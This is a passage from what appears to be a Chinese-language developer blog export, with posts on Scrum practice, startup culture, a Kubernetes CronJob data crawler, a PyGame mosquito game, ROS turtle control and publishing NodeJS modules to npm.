 # User Stroy我是一個網站使用者我想要可以提交 feedback這樣網站開發者就可以根據使用者的回饋去優化網站# Acceptance criteria當使用者點選右下角的圓點按鈕後，可以看到表單，表單上面有姓名、email 和回饋訊息三個欄位當使用者填完表單送出後若成功會閃出一個提交成功的訊息當使用者表單項目有缺漏時會有提示訊息提示

那些擔任 Scrum Master 學到的事在了解 Scrum 相關的專有名詞後我們就可以開始我們 Sprint 啦！但事實上，Scrum 只是一種框架和方法論，實際我們在執行 Scrum 時往往會因為團隊成員的不同或是組織文化的不同而產生不同的效果。接著讓我們來看看實際上在執行 Scrum 會有哪些需要留意的觀念

基礎建設和團隊素質很重要 CI&#x2F;CD 基礎建設、DevOps 文化、Agile 精神、團隊是否具備開發上所需的所有技能等都是 Scrum 運作能否順暢很重要的一環，若是基礎建設不穩，很多時候我們的點數估計往往會低估，造成 Sprint 運作上的困難。另外若是團隊成員都具備 T 型人才的能力也將讓 Scrum 運作更順暢

我們是一個職業球隊 Sprint 是以團隊為基礎，Burn down chart 不是一個人的 Burn down chart，所以若是有團隊夥伴遇到困難是需要其他夥伴協助（例如：對於系統架構不熟悉），其他比較熟悉的夥伴應該主動給予協助。若是有夥伴無法如期完成任務，其他若有夥伴已經完成手上的事情，也可以主動協助一起完成剩下的工作，確保 Sprint 結束後當初承諾的任務都是有可交付的產出

Scrum 是一面照妖鏡 透過 Scrum 可以讓當初不清楚的使用者需求、無根據的預估工作時間和無限制需求的亂象可以被攤在陽光下檢視和討論，才有機會透過 Scrum process 來管理和改善

通常絆腳石是你不能說名字的那個人 在推行 Scrum 時，公司高層和文化的支持也是十分重要，因為通常公司推展 Scrum 或是敏捷開發會失敗，通常絆腳石是你不能說名字的那個人

保持你的步伐 排定好時間後就固定下來，讓團隊成員可以調整好自己的節奏並有更多事情可以專注在任務完成上而非冗長會議或是雜事上

要測量才能進步 每次 Sprint 結束一定要有檢討並透過數據圖表等檢視可以改善的部分，持續優化整個流程

軟體開發流程沒有銀彈 講了那麼多，事實上 Scrum 也並非萬能，碰上常常會有臨時性任務或是 operation issue 特性任務的團隊，或許可以考慮使用 Kanban，更甚於 Scrum。另外，像是技術研究單位，使用 Scrum 也未必是一種好選擇


總結以上透過一個 Scrum Master 視角去探討 Scrum Master 在 Scrum Team 中所扮演的角色和可能遇到的挑戰和機遇。Scrum Master 是一個必須對於產品開發流程以及溝通能力有一定掌握並具備一定的技術實力的角色。說真的，真正要當的好 Scrum Master，不容易。事實上，Scrum 真正目標在於建立一個自我管理的組織，讓 Process 而非人來管理。當 Scrum 真正成功的時候，就是 Scrum Master 可以退休的時候了。
關於作者：@kdchang 文藝型開發者，夢想是做出人們想用的產品和辦一所心目中理想的學校。A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
參考文件
燃尽图 （Burn up and Burn down Chart）—介绍
Clear Acceptance Criteria and Why They’re Important
當一個 Scrum Master 是一個怎樣的體驗？

（image via eohcoastal）
]]></content>
      <tags>
        <tag>scrum</tag>
        <tag>scrum master</tag>
        <tag>product owner</tag>
        <tag>dev tame</tag>
        <tag>軟體工程師</tag>
        <tag>軟體工程</tag>
        <tag>software engineering</tag>
        <tag>敏捷開發</tag>
        <tag>agile</tag>
      </tags>
  </entry>
  <entry>
    <title>如何打造更好的科技新創 (Startup) 工作環境和組織文化？</title>
    <url>/2016/03/19/how-to-build-a-great-startup-culture/</url>
    <content><![CDATA[最近剛好在知乎上看到一篇矽谷新創公司文化和工作環境的文章 (內容主要還是以網路或科技新創公司為主)。這些公司雖然業務內容大不相同但還是有一些共通性。根據自己的經驗做一下翻譯和補充，期待未來台灣也能有更多世界一流的科技新創公司，提供人才更好的舞台和工作環境，大家一起加油啦！
第 0 步：找到對的人上車 (確保每位加入成員都能理解並認同公司價值觀和願景。打造優良的組織文化並不容易，但崩解可能只是一夕之間。最初 Airbnb 找第一號員工就花了約半年的時間！)
參考文件：Airbnb創辦人Brian Chesky談企業文化

開放式辦公室（但保有私人需要安靜專注的空間），直接溝通，少開會。代碼勝於雄辯 (Code wins arguments.)
免費食物，提供工作餐點，也可以說故意延長工作時間 :P
使用蘋果電腦 (Mac) 或 Linux， 以及使用 Linux 的雲端伺服器 (Cloud Server)
擁抱開源軟體 (Open Source)，利用各種可用工具，注意力集中在核心產品
快速迭代 (Iterate)，A &#x2F; B Testing，數據驅動思考 (Data Driven Thinking)
注重使用者體驗 (User Experience)，使用者利益大於獲利考慮
簡約設計，注重 MVP (最小可行) 的產品，敏捷開發
工程師文化，不惜代價找到最合適的人才，常舉辦內部 Hack Day。技術分享風氣濃厚，熱於學習新技術

事實上，以上幾點科技新創 (Startup) 的常見文化和工作環境未必合適於每個組織中。能找到合適的夥伴加入團隊，一起打造適合的文化和價值觀才是關鍵。
參考文件：

[翻譯] 是什麼造就了好的軟體工程文化？(上)
[翻譯] 是什麼造就了好的軟體工程文化？(下)

關於作者：@kdchang 文藝型開發者，夢想是做出人們想用的產品和辦一所心目中理想的學校。A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>Startup</tag>
        <tag>創新創業</tag>
        <tag>創業</tag>
        <tag>新創公司</tag>
        <tag>Code wins arguments</tag>
        <tag>Hack Day</tag>
        <tag>Linux, Mac</tag>
        <tag>Open Source</tag>
        <tag>User Experience</tag>
      </tags>
  </entry>
  <entry>
    <title>如何使用 K8S 自動化定期 CronJob 抓網路公開資料</title>
    <url>/2019/06/29/how-to-build-kubernetes-k8s-cronjob-crawler/</url>
    <content><![CDATA[
前言有使用 Linux 的讀者就知道，若是有定期需要執行的程式就可以 Crontab 把寫好的 script 透過定期的 scheduler 定期執行節省人力。一般常見的使用範疇就是定期更新檔案資料或是網路爬蟲等。今天我們則是要介紹，如何使用 Kubernetes（k8s） 的 CronJob 來自動化抓取網路公開資料（這邊我們使用政府公開資料的雨量資料 JSON 檔案），我們想要的定期執行程式的效果。好的，那就讓我們開始吧！
環境設定若是對於 Kubernetes（k8s）比較不熟悉的讀者可以想成是 Kubernetes（k8s）是一個大型的 container 調度和管理工具，透過 config 設定可以管理你的 dockerize 後的 application。
在這篇文章中我們會使用 minikube 這個 local 開發測試用的 Kubenetes（k8s）cluster 當作測試 demo 使用。若你的電腦還沒有安裝 Kubernetes（k8s）的相關環境的話，可以先參考官方網站的教學和我們之前的教學文章。
這邊我們使用 macOS 當作範例，需要安裝的有 virtual box、kubernetes-cli 和 minikube 並登入好你的 docker hub 帳戶：
確認一下若是你的 minikube 已經 start 成功，可以使用下列指令確認是否正常啟動：
$ kubectl cluster-info

另外也可以安裝 kubectx 這個好用小工具，方便你切換到不同 cluster，這邊我們要切換到 minikube。
撰寫 CronJob 程式和 Dockerfile因為範例為求簡單，這邊我們使用 Python 撰寫一個簡單每分鐘定期抓取政府公開資料的 python 程式，主要功能為：

抓取網路公開資料
根據時間儲存成 {datatime}.json 檔案到 &#x2F;data 資料夾下

範例程式 app.py： 
import jsonfrom datetime import datetimeimport globimport requestsdef main():    url = &#x27;https://opendata.cwb.gov.tw/fileapi/v1/opendataapi/O-A0002-001?Authorization=rdec-key-123-45678-011121314&amp;format=JSON&#x27;    resp = requests.get(url)    data = resp.json()    with open(&#x27;/data/&#123;&#125;.json&#x27;.format(datetime.utcnow()), &#x27;w&#x27;) as f:        json.dump(data, f)if __name__ == &#x27;__main__&#x27;:    main()

參考 Dockerfile：
FROM python:3.7-alpineADD . /codeWORKDIR /codeRUN pip install -r requirements.txtCMD [&quot;python&quot;, &quot;app.py&quot;]

若是完成後可以透過將我們的程式打包成 docker image 然後上傳到 docker hub 上，讓之後的 k8s cronjob 可以抓下來（當然若是私人專案或是公司專案可以考慮使用 google cloud registry 來 host 你的 image）。
打包 image 檔案（xxxx 為你的 docker hub id，k8s-cronjob-pvc-example 為 image 名稱，v1 為 tag 名稱）：
docker build -t xxxx/k8s-cronjob-pvc-example:v1

若是完成後可以使用 $ docker image list 觀看是否有正常顯示
接著就要推送到 docker hub 上面：
$ docker push xxxx/k8s-cronjob-pvc-example:v1

成功後應該就可以在你自己的 docker hub 上面看到上傳的 image 檔案！
撰寫 k8s CronJob config 檔案上傳 image 到 docker hub 後，我們要開始將我們的程式 deploy 到 minikube 這個 local k8s cluster 上面！
首先我們先定義 schedule 格式為：*/1 * * * * （每分鐘執行一次）
cron 主要格式 * * * * * 就是由左到右分別為：

分鐘
小時
每月中第幾天
月
星期幾

若是你對於 cronjob 格式比較不熟悉，可以參考這個網站，他可以透過輸入你的設定值告訴目前格式的效果，十分方便！
以下是參考的 cronjob.yaml 檔案：

我們設定 apiVersion 版本和 k8s config 類型 kind 為 CronJob
從 kdchang&#x2F;k8s-cronjob-pvc-example:v1 抓下來我們的程式
透過 &#x2F;bin&#x2F;sh 指令列印出 ls &#x2F;data 寫入檔案列表
值得注意的是由於 k8s 資源利用的設計，每次 pod 重啟不一定會是在同一個 node 上部屬，另外隨著 pod 的重啟在 local 的檔案生命週期也會隨之消失。這對於定期產生的  pod 完成後就回收的 CronJob 來說會是一個問題：因為我們想要我們定期抓下來的網路資料可以持續存在。關於這個問題我們可以使用寫入資料庫或是宣告 k8s persistent volume 並掛載檔案路徑到 CronJob 中來解決。

以下我們宣告 hostPath volumes 並把 volume mount 到 &#x2F;data 下面（hostPath 你可以想成若是 pod 重啟，會去找到上次的 pod 的檔案路徑和保留的檔案，當實務上會造成 pod 沒辦法有效 deploy 到適合的 node 上，此處因為使用 minikube 測試所以沒使用 GCP、AWS等 persistent volume 和外掛檔案系統）。
apiVersion: batch/v1beta1kind: CronJobmetadata:  name: k8s-cronjob-pvc-examplespec:  schedule: &quot;*/1 * * * *&quot;  jobTemplate:    spec:      template:        spec:          containers:          - name: k8s-cronjob-pvc-example            image: kdchang/k8s-cronjob-pvc-example:v1            args:            - /bin/sh            - -c            - ls /data            - date; echo Hello from the Kubernetes cluster            volumeMounts:            - mountPath: /data              name: crawl-data          restartPolicy: OnFailure          volumes:          - name: crawl-data            hostPath:              # directory location on host              path: /data              # this field is optional              type: Directory

接著執行我們的 cronjob.yaml
$ kubectl create -f cronjob.yamlcronjob.batch/k8s-cronjob-pvc-example created

此時使用以下指令應該就會看到 cronjob 開始執行
$ kubectl get cronjobNAME                      SCHEDULE      SUSPEND   ACTIVE   LAST SCHEDULE   AGEk8s-cronjob-pvc-example   */1 * * * *   False     0        &lt;none&gt;          11s

一分鐘後看到 cronjob pod 成功開始執行！
$ kubectl get podNAME                                       READY   STATUS      RESTARTS   AGEk8s-cronjob-pvc-example-1561892400-cbpc4   0/1     Completed   0          75sk8s-cronjob-pvc-example-1561892460-t9ckq   0/1     Completed   0          15s

觀看 log
$ kubectl logs -f k8s-cronjob-pvc-example-1561892400-cbpc42019-06-29 10:27:57.140583.json2019-06-29 10:27:57.492762.json2019-06-29 10:27:57.737316.json2019-06-29 10:27:58.996981.json2019-06-29 10:27:59.125029.json2019-06-29 10:27:59.140703.json2019-06-29 10:28:12.885361.json2019-06-29 10:28:12.942726.json2019-06-29 10:28:15.883667.json2019-06-29 10:28:40.844267.json2019-06-29 10:28:43.823896.json2019-06-29 10:28:44.787840.json2019-06-29 10:28:47.097306.json2019-06-29 10:28:48.122653.json2019-06-29 10:29:02.764501.json2019-06-29 10:29:21.785981.json2019-06-29 10:29:29.779006.json2019-06-29 10:29:35.822945.json2019-06-29 10:30:10.770817.json2019-06-29 10:30:53.822591.json2019-06-29 10:31:09.812561.json

若你要移除的話可以使用以下指令：
$ kubectl delete cronjob k8s-cronjob-pvc-examplecronjob.batch &quot;k8s-cronjob-pvc-example&quot; deleted

總結以上簡單介紹了如何使用 K8S 自動化定期 CronJob 抓網路公開資料。有許多開發者在從裸機 bare metal server 轉換到 Kubenetes（k8s) 的過程中常常會覺得 deubg 不太習慣，主要原因就是原本可以隨便 ssh 進去主機和抓取最新的資料並重啟機器的簡單粗暴方式變得麻煩，但若是能克服這一點的話，就能享受 dockerize 的可攜性和 k8s 的簡單擴展和部屬特性，更加專注在業務邏輯上。我們下回見囉，掰撲！
參考文件
Running Automated Tasks with a CronJob
Kubernetes, Docker, and Cron

關於作者：@kdchang 文藝型開發者，夢想是做出人們想用的產品和辦一所心目中理想的學校。A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>Python</tag>
        <tag>k8s</tag>
        <tag>cronjob</tag>
        <tag>kubernetes</tag>
        <tag>crontab</tag>
      </tags>
  </entry>
  <entry>
    <title>使用 Python 和 PyGame 遊戲製作入門教學</title>
    <url>/2019/10/19/how-to-build-up-game-with-pygame-tutorial/</url>
    <content><![CDATA[
前言隨著天氣越來越冷，很多人卻納悶蚊子為何不減反增。身為一個工程師若沒辦法成功在現實社會和蚊子好好相處，只好做打蚊子遊戲調劑身心（咦）。本文將透過一個打蚊子遊戲，帶領讀者學習如何使用 Python 的 PyGame 模組製作一個簡單的打蚊子遊戲，在學習遊戲開發的基本觀念的同時，也讓我們在虛擬社會中可以彌補現實社會中的遺憾（喂）。好啦，就讓我們開始 PyGame 遊戲開發之旅吧！
PyGame 初體驗PyGame 是一種 Python 用來製作遊戲的模組，它能讓開發者可以用更簡單的方式加入文字、圖案、聲音等元素並進行事件處理來開發遊戲。我們可以看到 PyGame 官方網站上有許多有趣的網友製作的有趣遊戲。
首先，我們先來進行環境設定，先確保你的作業系統有安裝 Python3，我們這邊使用的是 MacOS 作業系統。然後安裝我們的 pygame 模組。
$ pip install pygame

在開始 PyGame Hello World 之前我們先來認識 PyGame 幾大核心元素：

pygame.Surface：Surface 資料型別，代表一個矩形的影像，用來繪製在螢幕上
pygame.Rect：Rect 資料型別，用來定位矩形空間的位置和可以用來偵測物件是否碰撞的
pygame.event：事件模組，用來處理使用者觸發事件，包含自定義事件
pygame.font：文字模組，用來顯示文字，可用來顯示儀表板資料
pygame.draw：繪圖模組，可以畫出多邊形圖形，可當作背景物件
pygame.image：圖片模組，用來處理載入圖片等相關操作，可當作角色精靈（sprite）
pygame.time：時間模組，包含控制遊戲迴圈迭代速率，確保反饋不會太快消逝

接著我們直接使用 PyGame 製作一個 hello world 畫面，這樣讀者可以更清楚整個設計的架構：
import sysimport pygamefrom pygame.locals import QUIT# 初始化pygame.init()# 建立 window 視窗畫布，大小為 800x600window_surface = pygame.display.set_mode((800, 600))# 設置視窗標題為 Hello World:)pygame.display.set_caption(&#x27;Hello World:)&#x27;)# 清除畫面並填滿背景色window_surface.fill((255, 255, 255))# 宣告 font 文字物件head_font = pygame.font.SysFont(None, 60)# 渲染方法會回傳 surface 物件text_surface = head_font.render(&#x27;Hello World!&#x27;, True, (0, 0, 0))# blit 用來把其他元素渲染到另外一個 surface 上，這邊是 window 視窗window_surface.blit(text_surface, (10, 10))# 更新畫面，等所有操作完成後一次更新（若沒更新，則元素不會出現）pygame.display.update()# 事件迴圈監聽事件，進行事件處理while True:    # 迭代整個事件迴圈，若有符合事件則對應處理    for event in pygame.event.get():        # 當使用者結束視窗，程式也結束        if event.type == QUIT:            pygame.quit()            sys.exit()

成果如下：

開始製作打蚊子小遊戲在開始正式製作我們的遊戲前我們先來看個遊戲成果動畫：
通常我們在設計遊戲之前我們會定義一下遊戲規則，而我們的打蚊子遊戲規則十分簡單，就是打蚊子，打到一隻加五分，遊戲不會結束（喂）。以下定義一下會用到的核心設計：

左上方設有遊戲儀表板顯示目前分數
中間畫面有一隻大蚊子每 3 秒會換位置
當打到蚊子時會加五分，顯示 hit!! 在左上


建立 Mosquito 類別（繼承 pygame.sprite.Sprite），讓我們可以生產蚊子物件（由於我們需要判斷是否使用者的滑鼠有點擊到物件，所以需要透過 rect 來定位）：
class Mosquito(pygame.sprite.Sprite):    def __init__(self, width, height, random_x, random_y, widow_width, window_height):        super().__init__()        # 載入圖片        self.raw_image = pygame.image.load(&#x27;./mosquito.png&#x27;).convert_alpha()        # 縮小圖片        self.image = pygame.transform.scale(self.raw_image, (width, height))        # 回傳位置        self.rect = self.image.get_rect()        # 定位        self.rect.topleft = (random_x, random_y)        self.width = width        self.height = height        self.widow_width = widow_width        self.window_height = window_height

事件迴圈（其中我們主要偵測 MOUSEBUTTONDOWN 和 reload_mosquito_event 自定義事件）：
while True:    # 偵測事件    for event in pygame.event.get():        if event.type == QUIT:            pygame.quit()            sys.exit()        elif event.type == reload_mosquito_event:            # 偵測到重新整理事件，固定時間移除蚊子，換新位置            mosquito.kill()            # 蚊子新位置            random_x, random_y = get_random_position(WINDOW_WIDTH, WINDOW_HEIGHT, IMAGEWIDTH, IMAGEHEIGHT)            mosquito = Mosquito(IMAGEWIDTH, IMAGEHEIGHT, random_x, random_y, WINDOW_WIDTH, WINDOW_HEIGHT)        elif event.type == MOUSEBUTTONDOWN:            # 當使用者點擊滑鼠時，檢查是否滑鼠位置 x, y 有在蚊子圖片上，若有殺死蚊子並加分            if random_x &lt; pygame.mouse.get_pos()[0] &lt; random_x + IMAGEWIDTH and random_y &lt; pygame.mouse.get_pos()[1] &lt; random_y + IMAGEHEIGHT:                mosquito.kill()                random_x, random_y = get_random_position(WINDOW_WIDTH, WINDOW_HEIGHT, IMAGEWIDTH, IMAGEHEIGHT)                mosquito = Mosquito(IMAGEWIDTH, IMAGEHEIGHT, random_x, random_y, WINDOW_WIDTH, WINDOW_HEIGHT)                hit_text_surface = my_hit_font.render(&#x27;Hit!!&#x27;, True, (0, 0, 0))                points += 5    # 背景顏色，清除畫面    window_surface.fill(WHITE)    # 遊戲分數儀表板    text_surface = my_font.render(&#x27;Points: &#123;&#125;&#x27;.format(points), True, (0, 0, 0))    window_surface.blit(mosquito.image, mosquito.rect)    window_surface.blit(text_surface, (10, 0))    if hit_text_surface:        window_surface.blit(hit_text_surface, (10, 10))        hit_text_surface = None    pygame.display.update()    main_clock.tick(FPS)

隨機產生位置：
def get_random_position(widow_width, window_height, image_width, image_height):    random_x = random.randint(image_width, widow_width - image_width)    random_y = random.randint(image_height, window_height - image_height)    return random_x, random_y

完整程式碼如下：
import sys, timeimport randomimport pygamefrom pygame.locals import Color, QUIT, MOUSEBUTTONDOWN, USEREVENT, USEREVENTWINDOW_WIDTH = 800WINDOW_HEIGHT = 600WHITE = (255, 255, 255)IMAGEWIDTH = 300IMAGEHEIGHT = 200FPS = 60def get_random_position(widow_width, window_height, image_width, image_height):    random_x = random.randint(image_width, widow_width - image_width)    random_y = random.randint(image_height, window_height - image_height)    return random_x, random_y# init mosquito random positionclass Mosquito(pygame.sprite.Sprite):    def __init__(self, width, height, random_x, random_y, widow_width, window_height):        super().__init__()        self.raw_image = pygame.image.load(&#x27;./mosquito.png&#x27;).convert_alpha()        self.image = pygame.transform.scale(self.raw_image, (width, height))        self.rect = self.image.get_rect()        self.rect.topleft = (random_x, random_y)        self.width = width        self.height = height        self.widow_width = widow_width        self.window_height = window_heightdef main():    pygame.init()    # load window surface    window_surface = pygame.display.set_mode((WINDOW_WIDTH, WINDOW_HEIGHT))    pygame.display.set_caption(&#x27;Mosquito War&#x27;)    random_x, random_y = get_random_position(WINDOW_WIDTH, WINDOW_HEIGHT, IMAGEWIDTH, IMAGEHEIGHT)    mosquito = Mosquito(IMAGEWIDTH, IMAGEHEIGHT, random_x, random_y, WINDOW_WIDTH, WINDOW_HEIGHT)    reload_mosquito_event = USEREVENT + 1    pygame.time.set_timer(reload_mosquito_event, 300)    points = 0    my_font = pygame.font.SysFont(None, 30)    my_hit_font = pygame.font.SysFont(None, 40)    hit_text_surface = None    main_clock = pygame.time.Clock()    while True:        # 偵測事件        for event in pygame.event.get():            if event.type == QUIT:                pygame.quit()                sys.exit()            elif event.type == reload_mosquito_event:                # 偵測到重新整理事件，固定時間移除蚊子，換新位置                mosquito.kill()                # 蚊子新位置                random_x, random_y = get_random_position(WINDOW_WIDTH, WINDOW_HEIGHT, IMAGEWIDTH, IMAGEHEIGHT)                mosquito = Mosquito(IMAGEWIDTH, IMAGEHEIGHT, random_x, random_y, WINDOW_WIDTH, WINDOW_HEIGHT)            elif event.type == MOUSEBUTTONDOWN:                # 當使用者點擊滑鼠時，檢查是否滑鼠位置 x, y 有在蚊子圖片上                if random_x &lt; pygame.mouse.get_pos()[0] &lt; random_x + IMAGEWIDTH and random_y &lt; pygame.mouse.get_pos()[1] &lt; random_y + IMAGEHEIGHT:                    mosquito.kill()                    random_x, random_y = get_random_position(WINDOW_WIDTH, WINDOW_HEIGHT, IMAGEWIDTH, IMAGEHEIGHT)                    mosquito = Mosquito(IMAGEWIDTH, IMAGEHEIGHT, random_x, random_y, WINDOW_WIDTH, WINDOW_HEIGHT)                    hit_text_surface = my_hit_font.render(&#x27;Hit!!&#x27;, True, (0, 0, 0))                    points += 5        # 背景顏色，清除畫面        window_surface.fill(WHITE)                # 遊戲分數儀表板        text_surface = my_font.render(&#x27;Points: &#123;&#125;&#x27;.format(points), True, (0, 0, 0))        # 渲染物件        window_surface.blit(mosquito.image, mosquito.rect)        window_surface.blit(text_surface, (10, 0))        # 顯示打中提示文字        if hit_text_surface:            window_surface.blit(hit_text_surface, (10, 10))            hit_text_surface = None        pygame.display.update()        # 控制遊戲迴圈迭代速率        main_clock.tick(FPS)if __name__ == &#x27;__main__&#x27;:        main()

總結以上就透過一個簡單的打蚊子遊戲來介紹 PyGame 遊戲開發的流程，其中包含了遊戲背景、物件製作以及事件處理等。這個遊戲主要為 demo 使用，尚有很多需要還需要調整改進的地方。相信讀者在學會了相關概念後也迫不及待的想要製作屬於自己的遊戲了吧！或許讀者也可以在下課下班後自己來製作打蟑螂遊戲來調劑身心。我們下回見囉！
參考文件
mosquito 圖片
pygame学习笔记（5）——精灵
pygame 教學

關於作者：@kdchang 文藝型開發者，夢想是做出人們想用的產品和辦一所心目中理想的學校。A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>Python - PyGame - 遊戲製作 - game - 遊戲開發</tag>
      </tags>
  </entry>
  <entry>
    <title>如何用 ROS Topic 控制機器人移動</title>
    <url>/2016/09/03/how-to-control-bot-motion-by-ROSTopic/</url>
    <content><![CDATA[筆者今年在 COSCUP 2016 開了一個工作坊，教大家 ROS 的基礎以及 Gazebo 的基本概念，因為是第一次辦工作坊，還在學習怎麼拿捏時間跟內容，自覺並不是講得很完整，所以希望可以再提供一個簡單的範例，讓大家對 topic 傳輸要怎麼應用在控制機器人上會更有概念。
在工作坊講的內容 – Node, Topic and Service    COSCUP 2016 - ROS + Gazebo機器人模擬器工作坊  from Po-Jen Lai 

這份投影片裡面主要就是帶大家實際操作建立 package、寫 ROS Node、寫 ROS Topic 和 Service 傳輸資料的步驟，讓大家熟悉怎麼撰寫 ROS 程式，並帶到一點點使用 Gazebo 的基本概念，不過比較可惜的是沒有一個範例讓大家實際體會怎麼裡利用投影片裡教的機制來控制機器人，所以補充下面的章節，讓大家可以透過 Topic 簡單地控制機器人移動。
如何使用 Turtle_sim 模擬一隻可以接收 geometry_msgs&#x2F;Twist 型態接下來，來講一下怎麼透過 Topic 傳輸機制來控制 Turtlesim 裡面的機器人。首先讓我們啟動 turtlesim 的程式，使用下列指令：
roscorerosrun turtlesim turtlesim_node

啟動 Turtlesim 後，就會看到一個 GUI 介面，裡面有一隻可愛的烏龜。

ros@ros-K401UB:~$ rostopic list/rosout/rosout_agg/turtle1/cmd_vel/turtle1/color_sensor/turtle1/pose

接下來就讓我們開始寫程式吧，首先建立一個 package 並開始寫後續的程式：
cd ~/catkin_ws/srccatkin_create_pkg coscup_follow_up rospy geometry_msgscd coscup_follow_upvim src/circle_turtle.py

circle_turtle.py 的程式碼也很簡單，只是單純地送出一個 geometry_msgs&#x2F;Twist 的 command，所以我們只要定期送出一個 command 就可以讓這隻可愛的烏龜移動了。
#!/usr/bin/env pythonimport rospyfrom geometry_msgs.msg import Twist def circle_walker(): pub = rospy.Publisher(&#x27;turtle1/cmd_vel&#x27;, Twist, queue_size=10) rospy.init_node(&#x27;cmd_publisher_node&#x27;) rate = rospy.Rate(10) # 10hz cmd = Twist() count = 0; while not rospy.is_shutdown(): cmd.linear.x = 1 cmd.angular.z = 0.5 pub.publish(cmd) rate.sleep() if __name__ == &#x27;__main__&#x27;: try: circle_walker() except rospy.ROSInterruptException: pass

 最後只要把程式跑起來，就可以看到結果了。
 chmod +x src/circle_turtle.pycd ../..catkin_makesource devel/setup.bashrosrun coscup_follow_up circle_turtle.py


這邊要介紹一個簡單的機器人模型，也就是一般的兩輪機器人模型。在這種模型底下，其實你只能夠控制機器人的前後移動以及左右旋轉，所以程式中就只有指定 linear.x 跟 angular.z 的值 (因為就算其他值不給 0，也不會有任何反應)。
總結這篇文章算是將 COSCUP 工作坊的內容再稍微延伸一下，讓大家比較有見樹又見林的感覺，不會寫了一堆 node ，卻都還沒有碰到機器人，雖然內容對於已經熟悉 ROS 的讀者不難，但希望透過這篇文章可以幫助更多想上手的讀者降低學習的難度。
關於作者：@pojenlai 演算法工程師，對機器人跟電腦視覺有少許研究，最近在鍛鍊自己的執行力
]]></content>
      <tags>
        <tag>Robot</tag>
        <tag>ROS</tag>
      </tags>
  </entry>
  <entry>
    <title>如何做出一個好的 NodeJS 模組？</title>
    <url>/2018/02/14/how-to-make-a-good-node-module/</url>
    <content><![CDATA[前言這篇文章需要知道什麼是 NodeJS，簡單來說 NodeJS 讓 Javascript 可以變成一個後端的語言，而不是僅限瀏覽器才能解讀的前端語言。如果你還沒用過 NodeJS，首先需要安裝他，Windows 和 MacOS 的用戶可以直接上官網下載，Linux 的用戶推薦使用 NVM 安裝。
回想我們一開始學 C++ 的時候，如果想要用數學的函式，必須引入 cmath 函式庫（Library）才能呼叫 sin、cos 等函式。而我們在寫 NodeJS 的時候，一樣可能會需要引入函式庫加入主程式，在 NodeJS 中我們稱為模組（Module）。寫一個模組雖然很簡單，但若是想要讓自己寫的模組給更多人使用，就要注意一些小細節，讓我娓娓道來。
簡單的 NodeJS 模組在 NodeJS 中要寫模組很簡單，假設我今天寫了一個模組叫做 greeting，我可以這樣寫：

建立一個檔案叫做 greeting.js：
裡面內容是： // greeting.jsfunction greeting() &#123;    console.log(&quot;哈囉！你好嗎～&quot;);&#125;module.export = greeting;
注意到 module.export 是要輸出成模組的意思。

假設同目錄下，有一個主程式 index.js，當我想使用 greeting 的時候，我就可以引用模組來使用，呼叫方式是 require() 如以下：
// index.jsconst greeting = require(&#x27;./greeting&#x27;); // 要注意路徑greeting();

這時候打開終端機，執行主程式：
$ node index.js
就會輸出
&gt; 哈囉！你好嗎～
這就是最簡單的 NodeJS 模組了！
NPM 套件管理介紹 NPM今天假設我需要一個模組負責影像處理，我可能會需要自己寫一個模組，裡面可能包含裁切、變色、縮放等功能。但是俗話說的好：

Don’t reinventing the wheel!

不要自己造輪子，買一個回來不就得了！寫軟體也一樣，你遇到的問題，別人八成也遇過。意思是別人可能已經有寫好套件了！
而 NodeJS 世界中，有一個平台專門讓大家把自己寫的套件分享的平台，叫做 NPM，任何人都能下載裡面的套件，或是把套件上傳到平台上。在繼續之前，我們先來看一篇新聞，以下我擷取新聞稍做修改：

有一個稱為 left-pad 的模組，只有11行程式碼︰
  module.exports = leftpad;function leftpad(str, len, ch) &#123;    str = String(str);    var i = -1;    if (!ch &amp;&amp; ch !== 0) ch = &#x27; &#x27;;    len = len - str.length;    while (++i &lt; len) &#123;        str = ch + str;    &#125;    return str;&#125;
這個模組的工作非常簡單︰把一個字串的開頭補上字符，使其長度符合要求。假如程式員希望所有字串都是 5 個字元，不夠長的話都用 0 補上，使用 left-pad 就能把「369」變成「00369」。
如此簡單的 left-pad 很受歡迎——根據 NPM 統計數據，在過去一個月有超過 200萬次下載。很多開發人員也許未曾聽 left-pad，但在不經意的情況下用到這個模組——可能是他們使用的模組用到 left-pad，可能是他們使用的模組所使用的模組……如此類推。

先不管新聞討論爭議的問題（軟體自由與商業利益），我們看到一個簡單的套件對世界就有如此大的影響力，套件不一定要很厲害，但是好用最重要，打個比方就像螺絲，牽一髮而動全身。
分享到 NPM假設我們今天想分享一個套件，以我開發的小套件date2obj為例，告訴大家怎樣分享到 NPM 上。簡單介紹一下 date2obj，在寫 Javascipt 的時候，Date 時間物件常常要做分離的動作，雖然程式碼很短，但每個專案都要 copy 一次真的很麻煩，所以我弄成可以呼叫的套件。
分享到 NPM 的操作步驟如下：

在 Github 建立 date2obj 專案。
接著直接 git clone 下來。
終端機 cd date2obj 進入資料夾。
終端機輸入 npm init 用來初始化專案，如果有裝好 NodeJS 的話，npm 就是安裝好的了。
接下來終端機會出現問題，要你填寫專案名稱、版本號、作者、關鍵字等等資訊。什麼都不輸入，按下 enter 就是省略的意思。其中他會問主程式就照預設的 index.js 即可，而 test 可以先略過，版本號其實有它的意義，不過這邊我們可以隨便輸入或照預設的1.0.0。完成之後應該會看到目錄底下多一個 package.json 的檔案。
這時候目錄裡面應該只有一個檔案：package.json，我們要手動建立一個 index.js 檔案。
假設我們在 index.js 打好程式了。這邊我們來觀察 date2obj 的 index.js，最底下有一行 module.exports = date2obj;，這是關鍵！我們剛剛設定依照步驟將主程式設定為 index.js，在 package.json 裡面就是 &quot;main&quot;: &quot;index.js&quot;。

